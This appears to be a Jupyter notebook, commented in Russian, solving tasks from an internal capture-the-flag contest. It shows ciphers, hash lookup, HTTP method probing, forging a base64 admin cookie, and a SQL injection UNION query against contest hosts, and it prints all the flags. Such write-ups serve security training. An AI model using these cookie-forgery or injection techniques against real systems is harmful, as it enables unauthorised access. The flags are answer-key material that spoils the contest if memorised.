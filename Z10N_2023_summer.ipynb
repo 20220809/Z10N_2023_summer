{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Z10N 2023_summer"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Пояснения к решениям .\n",
    "для возможности выполнения кода , необходимо указать путь к файлам заданий :\n",
    "\n",
    "для Заданий 4 , 7 , 9 , 10  потребуется доступ из внутренней сети."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "TASK5_PATH = 'Z10N_task5.zip'  # к архиву 5 задания\n",
    "TASK5_PNG_EDITED = \"Z10N_task5.png\" # к файлу с достроенным qr-кодом 5 задания\n",
    "TASK8_PATH = 'Z10N_task8.pdf' # к файлу pdf 8 задания\n",
    "TASK11_PATH = \"Z10N_task11.zip\" # к архиву 11 задания\n",
    "TASK12_PATH = \"Z10N_task12.png\" # к картинке из 12 задания\n",
    "TASK15_PATH = \"Z10N_task15.png\" # к картинке из 15 задания"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Задание №1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 130,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# без комментариев"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 131,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import base64"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 132,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "code_1 = \"WjEwTntkMG50X3VzM19iYXMzXzY0X2Ywcl95MHVyX3MzY3IzdHN9\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 133,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "flag_1 = ''.join([ chr(i) for i in base64.standard_b64decode(code_1)])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 134,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Z10N{d0nt_us3_bas3_64_f0r_y0ur_s3cr3ts}'"
      ]
     },
     "execution_count": 134,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "flag_1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Задание №2\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 135,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "code_2 = \"A89M{Wzm_Yi9dm_o9e6h_gs8h_x8ks6i_zmw_n6_g99}\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 136,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#словарь для заглавных букв\n",
    "alpha_C = []\n",
    "for i in range(65,91):\n",
    "    alpha_C.append(chr(i))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 137,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#словарь для строчных букв\n",
    "alpha_s = []\n",
    "for i in range(97,123):\n",
    "    alpha_s.append(chr(i))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 138,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#словарь для цифр\n",
    "alpha_n = []\n",
    "for i in range(48,58):\n",
    "    alpha_n.append(chr(i))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 139,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# декодер для зашифрованной строки по словарю\n",
    "def decrypt_bafomet( inp , voc ):\n",
    "    res = ''\n",
    "    for symb in inp:\n",
    "        found = 0\n",
    "        for j in range(len(voc)):\n",
    "            if symb == voc[j]:\n",
    "                found = 1\n",
    "                res += voc[len(voc)-1-j]\n",
    "        if found == 0 :\n",
    "            res += symb\n",
    "    print(res)\n",
    "    return res"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 140,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Z89N{Dzm_Bi9dm_o9e6h_gs8h_x8ks6i_zmw_n6_g99}\n",
      "Z89N{Dan_Br9wn_l9v6s_th8s_c8ph6r_and_m6_t99}\n",
      "Z10N{Dan_Br0wn_l0v3s_th1s_c1ph3r_and_m3_t00}\n"
     ]
    }
   ],
   "source": [
    "# последовательно дешифруем код по 3 алфавитам: заглавных, строчных букв и цифр.\n",
    "flag_2 = decrypt_bafomet(decrypt_bafomet(decrypt_bafomet(code_2,alpha_C),alpha_s),alpha_n)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 141,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Z10N{Dan_Br0wn_l0v3s_th1s_c1ph3r_and_m3_t00}'"
      ]
     },
     "execution_count": 141,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "flag_2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Задание №3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 142,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Смотрим на код ... замечаем, что есть повторяющиеся триграммы, что наталкивает на мысль на какой-то \"странный\" алфавит ... \n",
    "# Самое сложное/простое (нужное подчеркнуть) - это найти этот алвавит\n",
    "\n",
    "code_3 = '503307202307415303403411202410'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "#### Response codes HTTP\n",
    "\n",
    "<p>503 - <b>S</b>ervice Unavailable</p>\n",
    "<p>307 - <b>T</b>emporary Redirect</p> \n",
    "<p>202 - <b>A</b>ccepted</p>\n",
    "<p>307 - <b>T</b>emporary Redirect</p> \n",
    "<p>415 - <b>U</b>nsupported Media Type</p>\n",
    "<p>303 - <b>S</b>ee Other</p>\n",
    "<p>403 - <b>F</b>orbidden</p>\n",
    "<p>411 - <b>L</b>ength Required</p>\n",
    "<p>202 - <b>A</b>ccepted</p>\n",
    "<p>410 - <b>G</b>one</p>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 143,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "flag_3 = 'Z10N{statusflag}'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 144,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Z10N{statusflag}'"
      ]
     },
     "execution_count": 144,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "flag_3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Задание №4"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 145,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HTTP/1.1 200 OK\n",
      "Server: nginx/1.18.0\n",
      "Date: Fri, 28 Jul 2023 16:14:20 GMT\n",
      "Content-Type: text/html; charset=UTF-8\n",
      "Content-Length: 247\n",
      "Connection: keep-alive\n",
      "X-CSRF-Token: f81bb558-8940-45c9-af1c-2e3a70d022ed\n",
      "set-cookie: _session=AAAAMG_mVtBmxPkORxbbUBc-ZmeXeiS0f9P3Ko2_vTOJxDL-Btjy4dcIY2m1JxVGQLcJKuL-XAIXDSg6QKxagR6uEnIKu-VKH_MLXjjuOP__lgod; Path=/; HTTPOnly\n",
      "\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "\n",
      "  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n",
      "  0   247    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n"
     ]
    }
   ],
   "source": [
    "# Достанем token и сессионный куки.\n",
    "!curl -I https://z1on-442f.apps.prom-gen1-as.sigma.sbrf.ru/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 146,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "        <head>\n",
      "          <title>Z10N</title>\n",
      "        </head>\n",
      "        <body>\n",
      "          <h1>Hello, server datetime =\n",
      "            28-07-2023 19:14:21\n",
      "          </h1>\n",
      "          <div>Good work. First part of flag = 'Z10N{http_m3th'</div>\n",
      "          <div>But you must use another methods to find more.</div>\n",
      "        </body>\n",
      "      </html>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "\n",
      "  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n",
      "100   337  100   337    0     0   5435      0 --:--:-- --:--:-- --:--:--  5435\n"
     ]
    }
   ],
   "source": [
    "# Пробуем разные http методы, и смотрим на ответ сервера \n",
    "!curl -X PUT -H \"X-CSRF-Token: a0195e87-d568-4518-83e7-a24c52972aec\" -H \"Cookie:_session=AAAAMOoVyzQSWo5VTVLi0ADZMQeGjuY8WGejLGi61laFReegUHUGaAAsdSRXMBaIM1jjs-5JkTuOx5MNmrMOY9PD1v3a-gN9FngM4NIwjoy6OVRG\" https://z1on-442f.apps.prom-gen1-as.sigma.sbrf.ru/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 147,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "        <head>\n",
      "          <title>Z10N</title>\n",
      "        </head>\n",
      "        <body>\n",
      "          <h1>Hello, server datetime =\n",
      "            28-07-2023 19:14:21\n",
      "          </h1>\n",
      "          <div>Good work. Second part of flag = '0ds_@r3_v3'</div>\n",
      "          <div>But you must use another methods to find more.</div>\n",
      "        </body>\n",
      "      </html>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "\n",
      "  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n",
      "100   334  100   334    0     0   5387      0 --:--:-- --:--:-- --:--:--  5387\n"
     ]
    }
   ],
   "source": [
    "!curl -X PATCH -H \"X-CSRF-Token: a0195e87-d568-4518-83e7-a24c52972aec\" -H \"Cookie:_session=AAAAMOoVyzQSWo5VTVLi0ADZMQeGjuY8WGejLGi61laFReegUHUGaAAsdSRXMBaIM1jjs-5JkTuOx5MNmrMOY9PD1v3a-gN9FngM4NIwjoy6OVRG\" https://z1on-442f.apps.prom-gen1-as.sigma.sbrf.ru/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 148,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "        <head>\n",
      "          <title>Z10N</title>\n",
      "        </head>\n",
      "        <body>\n",
      "          <h1>Hello, server datetime =\n",
      "            28-07-2023 19:14:22\n",
      "          </h1>\n",
      "          <div>Good work. Third part of flag = 'ry_diff3r3nt}'</div>\n",
      "          <div>FINAL!</div>\n",
      "        </body>\n",
      "      </html>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "\n",
      "  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n",
      "100   296  100   296    0     0   4698      0 --:--:-- --:--:-- --:--:--  4698\n"
     ]
    }
   ],
   "source": [
    "!curl -X DELETE -H \"X-CSRF-Token: a0195e87-d568-4518-83e7-a24c52972aec\" -H \"Cookie:_session=AAAAMOoVyzQSWo5VTVLi0ADZMQeGjuY8WGejLGi61laFReegUHUGaAAsdSRXMBaIM1jjs-5JkTuOx5MNmrMOY9PD1v3a-gN9FngM4NIwjoy6OVRG\" https://z1on-442f.apps.prom-gen1-as.sigma.sbrf.ru/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 149,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "flag_4 = 'Z10N{http_m3th0ds_@r3_v3ry_diff3r3nt}'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 150,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Z10N{http_m3th0ds_@r3_v3ry_diff3r3nt}'"
      ]
     },
     "execution_count": 150,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "flag_4"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Задание №5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 152,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# У нас есть хеш пароля ... ищем в открытом доступе Rainbow Tables и пробуем , \n",
    "# вдруг там есть уже мапинг нашего хеша и открытого пароля\n",
    "code_5 = 'b96a0cc93922e6303997cbb7831ec71f'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 151,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "from matplotlib import pyplot as plt\n",
    "import hashlib\n",
    "import zipfile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 153,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# нашли в табличке пароль, убедимся, что он дает такой же хеш\n",
    "password = 'thisismypasswordyoullnevergetit'\n",
    "hash = hashlib.md5()\n",
    "hash.update(bytes(password,'ascii'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 154,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 154,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "code_5 == hash.hexdigest()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 155,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x2158eca9a90>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "#посмотрим на архив\n",
    "zf_5 = zipfile.ZipFile(TASK5_PATH)\n",
    "qr_raw = zf_5.open('qr_code.png',pwd=bytes(password,'utf-8'))\n",
    "qr = plt.imread(qr_raw)\n",
    "plt.imshow(qr)\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 156,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x2158f9fe320>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# нужно достроить картинку до полноценного QR (для этого нужно почитать по стандарту формирования qr-кода).\n",
    "# результат откроем любым из доступных сканеров QR-кодов\n",
    " \n",
    "plt.title(\"QR Image\")\n",
    " \n",
    "image = plt.imread(TASK5_PNG_EDITED)\n",
    "plt.imshow(image)\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 157,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "task_5 = 'Z10N{ar3_y0u_kn0w_@b0ut_qr}'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 158,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Z10N{ar3_y0u_kn0w_@b0ut_qr}'"
      ]
     },
     "execution_count": 158,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "task_5"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Задание №6"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "По ссылке из задания (не сохранилась), необходимо последовательно через TAB пролистать отбражаемые прямоугольники и записать последовательно площади фигур.\n",
    "каждому значению площади сопоставить порядковый номер буквы латинского алфавита.\n",
    "в результате получим слово для флага:  \"fantastic\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 159,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "task_6 ='Z10N{fantastic}'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 160,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Z10N{fantastic}'"
      ]
     },
     "execution_count": 160,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "task_6"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Задание №7"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HTTP/1.1 200 OK\n",
      "Server: nginx/1.18.0\n",
      "Date: Mon, 31 Jul 2023 12:53:33 GMT\n",
      "Content-Type: text/html; charset=UTF-8\n",
      "Content-Length: 199\n",
      "Connection: keep-alive\n",
      "etag: \"G_s2v0fTyDbEYBC1gVYYrg\"\n",
      "\n",
      "<html>\n",
      "        <head>\n",
      "          <title>Z10N</title>\n",
      "        </head>\n",
      "        <body>\n",
      "          <h1>Hello, server datetime =\n",
      "            31-07-2023 15:53:33\n",
      "          </h1>\n",
      "        </body>\n",
      "      </html>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "\n",
      "  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n",
      "100   199  100   199    0     0   3209      0 --:--:-- --:--:-- --:--:--  3209\n"
     ]
    }
   ],
   "source": [
    "!curl -i https://z1on-6786.apps.prom-gen1-as.sigma.sbrf.ru"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import pycurl\n",
    "from io import BytesIO"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "buffer = BytesIO()\n",
    "c = pycurl.Curl()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Нам нужно прочитать файл robots.txt ( да , еще одно открытие о мире web).\n",
    "c.setopt(c.URL,'https://z1on-6786.apps.prom-gen1-as.sigma.sbrf.ru/robots.txt')\n",
    "c.setopt(c.SSL_VERIFYPEER, 1)\n",
    "c.setopt(c.HEADER,1 )\n",
    "c.setopt(pycurl.DIRLISTONLY, 1)\n",
    "c.setopt(c.VERBOSE, 1)\n",
    "c.setopt(c.WRITEFUNCTION, buffer.write)\n",
    "c.perform()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HTTP/1.1 200 OK\r\n",
      "Server: nginx/1.18.0\r\n",
      "Date: Mon, 31 Jul 2023 12:53:38 GMT\r\n",
      "Content-Type: text/plain\r\n",
      "Content-Length: 39\r\n",
      "Connection: keep-alive\r\n",
      "cache-control: public, max-age=31536000\r\n",
      "access-control-max-age: 31536000\r\n",
      "expires: Tue, 30 Jul 2024 12:53:38 GMT\r\n",
      "etag: \"\"N07e0fe1WB5D6bAfQ5sfnw\"\"\r\n",
      "\r\n",
      "User-agent: *\n",
      "Disallow: /s3cr3tAdm1nUrl\n"
     ]
    }
   ],
   "source": [
    "body = buffer.getvalue()\n",
    "print(body.decode('iso-8859-1'))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 166,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HTTP/1.1 200 OK\r\n",
      "Server: nginx/1.18.0\r\n",
      "Date: Fri, 28 Jul 2023 16:14:23 GMT\r\n",
      "Content-Type: text/plain\r\n",
      "Content-Length: 39\r\n",
      "Connection: keep-alive\r\n",
      "cache-control: public, max-age=31536000\r\n",
      "access-control-max-age: 31536000\r\n",
      "expires: Sat, 27 Jul 2024 16:14:23 GMT\r\n",
      "etag: \"\"N07e0fe1WB5D6bAfQ5sfnw\"\"\r\n",
      "\r\n",
      "User-agent: *\n",
      "Disallow: /s3cr3tAdm1nUrlHTTP/1.1 200 OK\r\n",
      "Server: nginx/1.18.0\r\n",
      "Date: Fri, 28 Jul 2023 16:14:23 GMT\r\n",
      "Content-Type: text/html; charset=UTF-8\r\n",
      "Content-Length: 188\r\n",
      "Connection: keep-alive\r\n",
      "set-cookie: system=aXNBZG1pbj1mYWxzZQ==; Path=/; HTTPOnly\r\n",
      "set-cookie: secret=aXQgaXMgZmFrZSA9KQ==; Path=/; HTTPOnly\r\n",
      "set-cookie: session=aXQgaXMgZmFrZSB0b28gPSk=; Path=/; HTTPOnly\r\n",
      "set-cookie: admin=KT0gZWthZiBzaSB0aQ==; Path=/; HTTPOnly\r\n",
      "etag: \"VuTIYDPYbqb2kKz1tlwi6Q\"\r\n",
      "\r\n",
      "<html>\n",
      "          <head>\n",
      "            <title>Z10N s3cr3tAdm1nPage</title>\n",
      "          </head>\n",
      "          <body>\n",
      "            <h1>Hello, your are not Admin!</h1>\n",
      "          </body>\n",
      "        </html>\n"
     ]
    }
   ],
   "source": [
    "# перейдем по скрытому пути\n",
    "c.setopt(c.URL,'https://z1on-6786.apps.prom-gen1-as.sigma.sbrf.ru/s3cr3tAdm1nUrl')\n",
    "c.perform()\n",
    "\n",
    "body = buffer.getvalue()\n",
    "print(body.decode('iso-8859-1'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import base64"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'isAdmin=false'"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Путем перебора находим куки, который отвечает за параметр isAdmin\n",
    "base64.decodebytes(b'aXNBZG1pbj1mYWxzZQ==')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 169,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'aXNBZG1pbj10cnVl\\n'"
      ]
     },
     "execution_count": 169,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# закодируем нужное значение параметра в base64\n",
    "base64.encodebytes(b'isAdmin=true')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "          <head>\n",
      "            <title>Z10N s3cr3tAdm1nPage</title>\n",
      "          </head>\n",
      "          <body>\n",
      "            <h1>Hello, your are not Admin!</h1>\n",
      "          </body>\n",
      "        </html>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "\n",
      "  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n",
      "100   188  100   188    0     0   3032      0 --:--:-- --:--:-- --:--:--  3032\n"
     ]
    }
   ],
   "source": [
    "# сохраним локально куки-файл и обновим для куки system значение в base64 кодировке для строки isAdmin=true \n",
    "!curl -c cookiex.txt https://z1on-6786.apps.prom-gen1-as.sigma.sbrf.ru/s3cr3tAdm1nUrl"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "          <head>\n",
      "            <title>Z10N s3cr3tAdm1nPage</title>\n",
      "          </head>\n",
      "          <body>\n",
      "            <h1>Hello, your are Admin! And your flag is\n",
      "              Z10N{d0_y0u_1ik3_c00ki3$}\n",
      "            </h1>\n",
      "          </body>\n",
      "        </html>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "\n",
      "  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n",
      "100   254  100   254    0     0   4031      0 --:--:-- --:--:-- --:--:--  4031\n"
     ]
    }
   ],
   "source": [
    "# используем обновленный куки для доступа к скрытой страничке.\n",
    "!curl -b cookiex.txt https://z1on-6786.apps.prom-gen1-as.sigma.sbrf.ru/s3cr3tAdm1nUrl"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 173,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "flag_7 ='Z10N{d0_y0u_1ik3_c00ki3$}'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 174,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Z10N{d0_y0u_1ik3_c00ki3$}'"
      ]
     },
     "execution_count": 174,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "flag_7"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Задание №8"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 175,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import zlib\n",
    "import re\n",
    "import numpy as np"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 176,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Распарсим объекты в pdf фале и откроем 13 объект, который соответствует wav-файлу\n",
    "pdf = open(TASK8_PATH, \"rb\").read()\n",
    "stream = re.compile(rb'.*?FlateDecode.*?stream(.*?)endstream', re.S)\n",
    "\n",
    "for i,s in enumerate(stream.findall(pdf)):\n",
    "    \n",
    "    s = s.strip(b'\\r\\n')\n",
    "    try:\n",
    "        if i == 13:\n",
    "            fd = open('obj_{}.wav'.format(i),'wb')\n",
    "            fd.write(zlib.decompress(s))\n",
    "            fd.close()\n",
    "        i += 1\n",
    "    except:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 177,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x2158f94dac8>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# посмотрим на значения в фалйе \n",
    "from scipy.io.wavfile import read\n",
    "import matplotlib.pyplot as plt\n",
    "# read audio samples\n",
    "input_data = read(\"obj_13.wav\")\n",
    "audio = input_data[1]\n",
    "# plot the first 1024 samples\n",
    "plt.figure(figsize=(20.0,4.0))\n",
    "plt.plot(audio)\n",
    "# label the axes\n",
    "plt.ylabel(\"Amplitude\")\n",
    "plt.xlabel(\"Time\")\n",
    "# set the title\n",
    "plt.title(\"Sample Wav\")\n",
    "# display the plot\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 178,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "246 754\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x21590251470>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "247 751\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x215901bf0b8>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "248 747\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x2159025fbe0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# испытав все что можно на слух , приступим к просмотру данных\n",
    "# для этого ищем пропорции для картинки до получения читаемого текста\n",
    "\n",
    "for i in range(246,249,1):\n",
    "    plt.figure(figsize=(12.0,6.0))\n",
    "    j = len(audio)//(i*4)\n",
    "    size = i*j*4\n",
    "    imgage = np.reshape(audio[:size],(i,j,4))\n",
    "    plt.imshow(imgage)\n",
    "    print(i,j)\n",
    "    plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 179,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "flag_8 = 'Z10N{w@v_@ud10_f1@g}'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 180,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Z10N{w@v_@ud10_f1@g}'"
      ]
     },
     "execution_count": 180,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "flag_8"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Задание №9"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 181,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# строим SQL-инъекцию для доступа к скрытым данным\n",
    "injection = 'https://z1on-b328.apps.prom-gen1-as.sigma.sbrf.ru/userInfo?id=-1%20UNION%20SELECT%20%201%20as%20ID,%20text%20as%20NAME%20from%20CUSTOM_FLAGS_1Q2W3E4R'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 182,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HTTP/1.1 200 OK\n",
      "Server: nginx/1.18.0\n",
      "Date: Fri, 28 Jul 2023 16:14:26 GMT\n",
      "Content-Type: text/html; charset=UTF-8\n",
